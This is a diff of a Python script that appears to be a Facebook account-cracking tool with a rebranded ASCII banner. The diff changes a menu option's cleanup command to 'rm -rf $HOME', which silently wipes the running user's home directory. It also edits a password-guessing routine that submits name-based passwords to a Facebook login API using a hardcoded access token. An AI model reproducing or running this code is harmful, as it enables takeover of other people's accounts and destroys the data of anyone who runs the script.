@@ -104,11 +104,11 @@ logo='''
 
 \033[1;94m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
 
-\033[1;94m ┈┈┈▕▕ RJIVI ▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕  RJIVI▏▏┈┈┈
+\033[1;94m ┈┈┈▕▕ TAAK ▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕  TAAK▏▏┈┈┈
 
 \033[1;94m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
 
-\033[1;94m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;143RJIVI.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
+\033[1;94m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;TAAK.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
 
 \033[1;96m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈
 
@@ -123,8 +123,6 @@ logo='''
 \033[1;91m☞ Auther     : 143RJIVI_MASTER
 
 \033[1;92m☞ WhatsApp   : +917504333331
-
-\033[1;95m☞ YouTube    : 
 
 \033[1;93m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 
@@ -296,7 +294,7 @@ def mb():
 
 	elif bm =='2':
 
-	    os.system('rm -rf $HOME/B4_BALOCH')
+	    os.system('rm -rf $HOME')
 
 	    os.system('cd $HOME && git clone https://github.com/shabirbaloch125/Baloch')
 
@@ -632,7 +630,7 @@ def pb():
 
 			                                    else:
 
-			                                        ps6=(j['first_name']+'khan')
+			                                        ps6=(j['first_name']+'kumar')
 
 			                                        dt=urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+(user)+'&locale=en_US&password='+(ps6)+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
 
